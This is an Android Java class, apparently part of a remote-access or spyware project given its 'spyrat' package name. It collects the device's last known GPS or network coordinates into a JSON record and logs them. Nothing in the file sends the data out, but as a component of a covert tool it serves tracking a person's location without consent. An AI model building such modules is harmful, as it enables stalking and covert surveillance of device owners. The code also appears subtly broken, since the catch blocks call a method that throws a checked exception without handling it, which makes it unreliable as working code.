package com.spyrat.investigation;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;
import org.json.JSONObject;

public class RealLocationCollector {
    private static final String TAG = "RealLocationCollector";
    private Context context;

    public RealLocationCollector(Context context) {
        this.context = context;
    }

    public JSONObject getCurrentLocation() {
        JSONObject location = new JSONObject();
        
        try {
            Log.d(TAG, "📍 Starting location collection...");
            
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            // Try GPS first
            Location gpsLocation = null;
            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            
            // Try network if GPS not available
            Location networkLocation = null;
            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            // Use the best available location
            Location bestLocation = gpsLocation != null ? gpsLocation : networkLocation;
            
            if (bestLocation != null) {
                location.put("latitude", bestLocation.getLatitude());
                location.put("longitude", bestLocation.getLongitude());
                location.put("accuracy", bestLocation.getAccuracy());
                location.put("provider", bestLocation.getProvider());
                location.put("timestamp", bestLocation.getTime());
                location.put("altitude", bestLocation.hasAltitude() ? bestLocation.getAltitude() : 0);
                
                Log.d(TAG, "✅ Location collected: " + bestLocation.getLatitude() + ", " + bestLocation.getLongitude());
            } else {
                // Fallback location
                location.put("latitude", 0.0);
                location.put("longitude", 0.0);
                location.put("accuracy", 0.0);
                location.put("provider", "none");
                location.put("timestamp", System.currentTimeMillis());
                location.put("altitude", 0.0);
                Log.w(TAG, "⚠️ No location available, using fallback");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Location permission denied: " + e.getMessage());
            // Fallback
            location.put("latitude", 0.0);
            location.put("longitude", 0.0);
            location.put("accuracy", 0.0);
            location.put("provider", "permission_denied");
            location.put("timestamp", System.currentTimeMillis());
            location.put("altitude", 0.0);
        } catch (Exception e) {
            Log.e(TAG, "❌ Location collection error: " + e.getMessage());
            // Fallback
            location.put("latitude", 0.0);
            location.put("longitude", 0.0);
            location.put("accuracy", 0.0);
            location.put("provider", "error");
            location.put("timestamp", System.currentTimeMillis());
            location.put("altitude", 0.0);
        }
        
        return location;
    }
}
